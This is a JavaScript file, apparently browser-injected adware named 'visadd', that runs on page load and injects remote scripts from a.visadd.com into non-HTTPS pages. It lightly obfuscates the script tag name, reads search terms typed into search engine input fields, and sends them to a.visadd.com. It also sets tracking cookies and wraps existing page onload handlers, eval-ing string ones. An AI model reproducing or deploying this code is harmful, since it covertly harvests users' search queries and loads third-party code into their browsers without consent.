
(function(){
if (window.visadd){
// do nothing
} else{
window.visadd = {};
visadd.preload = {
domain_blacklist: ';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;youtube.com;',
domain_restricted: '',
domain_search: ';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',
page_blacklist: '',
encoded_partner: '14567725608',
sub_id: 'na',
issued_request: false,
search_term_to_use: null,
over_cap: false,
cap_x24: 10,
language: function(){
try{
//var full_html = document.documentElement.outerHTML;
//var reg_ex = new RegExp("lang=", "i");
var lang = document.documentElement.lang || navigator.language || navigator.userLanguage;
if (lang == null || typeof(lang) == 'undefined'){
lang = "";
} else{
if (lang.length > 2){
lang = lang[0] + lang[1]
}
}
} catch(e){
return 'en'
// do nothing
}
return lang;
},
injectScript: function(url) {
var script = document.createElement('sc' + 'ript');
script.setAttribute('type', 'text/jav' + 'ascri' + 'pt');
script.type = 'text/jav' + 'ascri' + 'pt';
script.src = url;
if (document.body) {
document.body.appendChild(script);
} else {
var hs = document.getElementsByTagName('head');
if (hs && hs.length > 0) {
var h = hs[0]
h.appendChild(script);
}
}
},
checkDomain: function(ourHostName,list)
{
var i,subsHosts;
if (ourHostName == undefined || ourHostName.length == 0)
return false;
ourHostName = ourHostName.toLowerCase();
ourHostName = ourHostName.replace("www.", "");
var ourHostName2 = null;
subsHosts = ourHostName.replace(/[^.]/g, "").length; // how many time there are "."
for(i=0 ; i <= subsHosts ; i++) {
if(list.indexOf(";"+ourHostName+";") != -1){
return true;
}
if (ourHostName2 != null && list.indexOf(";"+ourHostName2+";") != -1){
return true;
}
if (ourHostName2 == null)
ourHostName2 = ourHostName
var dot_index = ourHostName2.indexOf(".")
if (dot_index > -1){
ourHostName2 = ourHostName2.substring(ourHostName2.indexOf(".")+1,ourHostName2.length);
}
dot_index = ourHostName.indexOf(".")
if (dot_index > -1){
ourHostName = ourHostName.substring(0, ourHostName.lastIndexOf("."));
}
}
return false;
},
setCookie: function(c_name,value,exdays, path)
{
var exdate= null;
if (exdays != null){
exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
}
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString())+ ((path==null || typeof(path) == 'undefined') ? "" : "; path="+path);
document.cookie=c_name + "=" + c_value;
},
/* Get cookie by its name */
getCookie : function(c_name) {
if (document.cookie.length > 0) {
var c_start = document.cookie.indexOf(c_name + "=");
if (c_start != -1) {
c_start = c_start + c_name.length + 1;
c_end = document.cookie.indexOf(";", c_start);
if (c_end == -1) c_end = document.cookie.length;
return unescape(document.cookie.substring(c_start, c_end));
}
}
return null;
},
isBlackList: function() {
var ourHostName = document.location.host;
return visadd.preload.checkDomain(ourHostName, visadd.preload.domain_blacklist)
},
isDomainAllowed: function(){
if (visadd.preload.domain_restricted.length > 0){
var ourHostName = document.location.host;
return visadd.preload.checkDomain(ourHostName, visadd.preload.domain_restricted);
}
return true;
},
isPageAllowed: function(){
return visadd.preload.protocol() != "https:";
},
isTimeAllowed: function(){

// check if time was locked
var value = visadd.preload.getCookie("visadd_lock_time");
if (value != null && value != document.location){
return false;
}
var lock_counter = visadd.preload.getCookie("visadd_lock_count");
if (lock_counter != null && parseInt(lock_counter) > visadd.preload.cap_x24){
return false;
}

return true;
},
title: function(){
return document.title;
},
tags: function(){
return "";
},
isSearch: function(ourHostName){
return visadd.preload.checkDomain(ourHostName, visadd.preload.domain_search);
},
protocol: function(){
var protocol = "http:";
if (window.location != null){
protocol = window.location.protocol;
if (protocol.indexOf("http") < 0){
protocol = "http:"
}
}
return protocol
},
search_ref_callback: function(search_details){
if (search_details != null){
var search_details_split = search_details.split("$!$");
var search_term = search_details_split[0];
var cookie_referrer = search_details_split[1];
if (document.referrer){
var referrer_match = document.referrer.match('http[s]?://([a-zA-Z0-9-_\.]+)(:[0-9]+)?');
var referrer_host = null;
if (referrer_match && referrer_match != null){
referrer_host = referrer_match[1];
referrer_host = referrer_host.replace("www.", "")
}
if (cookie_referrer == referrer_host){
var params = '';
visadd.preload.search_term_to_use = search_term;
params = params + "pid=" + escape(visadd.preload.encoded_partner) + "&ln=" + visadd.preload.language();
visadd.preload.injectScript(visadd.preload.protocol() + '//a.visadd.com/script/layer?' + params);
}
}
}
},
search_check_count: 0,
onSearchReady: function(){
var search_term = "";
var input_element = document.getElementsByTagName("input");
if (input_element != null && typeof (input_element) != 'undefined' && input_element.length > 0){
for (i = 0; i < input_element.length; i++) {
if (typeof (input_element[i]) != 'undefined'){
if (input_element[i].type == "text" && input_element[i].value.length > 0){
search_term = input_element[i].value;
if (document.location.host.indexOf("google") > -1){
input_element[i].onblur = function() {visadd.preload.onSearchReady();};
}
break;
}
}
}
}
if (search_term.length > 0){
var referrer_host = document.location.host.replace("www.", "")
var value = search_term + "$!$" + referrer_host + "$!$"
var params = "exp=3&nm=visadd_st&vl=" + escape(value);
visadd.preload.injectScript(visadd.preload.protocol() +'//a.visadd.com/cookies/create.js?' + params);
} else if (visadd.preload.search_check_count < 10) {
visadd.preload.search_check_count = visadd.preload.search_check_count + 1;
setTimeout(function() { visadd.preload.onSearchReady(); }, 500);
}
},
init: function(){
if (window.top != window.self) //don't run on frames or iframes
{
return;
}
if (!visadd.preload.isBlackList() && visadd.preload.isPageAllowed()){
if (visadd.preload.isDomainAllowed()){
visadd.preload.over_cap = !visadd.preload.isTimeAllowed();
var params = '';
params = params + "pid=" + escape(visadd.preload.encoded_partner)+ "&ln=" + visadd.preload.language();
/*params = params + (document.charset ? '&charset='+document.charset : (document.characterSet ? '&charset='+document.characterSet : ''));
if (document.context) {
params = params + "&context=" + escape(document.context);
}
params = params + "&ti=" + escape(visadd.preload.title());
if (document.referrer){
params = params + "&referer=" + escape(document.referrer);
}
params = params + "&loc=" + escape(window.location) + "&dm=" + escape(window.location.host);*/
visadd.preload.injectScript(visadd.preload.protocol() + '//a.visadd.com/script/layer?' + params);
}else{
if (visadd.preload.isTimeAllowed()){
if (document.referrer){
var referrer_match = document.referrer.match('http[s]?://([a-zA-Z0-9-_\.]+)(:[0-9]+)?');
var referrer_host = null;
if (referrer_match && referrer_match != null){
referrer_host = referrer_match[1];
referrer_host = referrer_host.replace("www.", "")
}
if (referrer_host != null){
if (visadd.preload.isSearch(referrer_host)){
var params = "nm=visadd_st&cb=visadd.preload.search_ref_callback&ot=true"
visadd.preload.injectScript(visadd.preload.protocol() + '//a.visadd.com/cookies/get.js?' + params);
}
}
}
}
}
}
var curr_host = document.location.host.replace("www.", "")
if (visadd.preload.isSearch(curr_host)){
if (document.readyState == 'complete') {
visadd.preload.onSearchReady();
}
else if (document.addEventListener) {
document.addEventListener('DOMContentLoaded', visadd.preload.onSearchReady, false);
// Bad citizens.
} else if (document.attachEvent) {
document.attachEvent('onreadystatechange', visadd.preload.onSearchReady);
}
var oldonload = window.onload;
window.onload = function() {
visadd.preload.onSearchReady();
if (oldonload) {
if (typeof oldonload == 'string') {
eval(oldonload);
} else {
oldonload();
}
}
}
}
}
}
visadd.preload.init();
}
}());
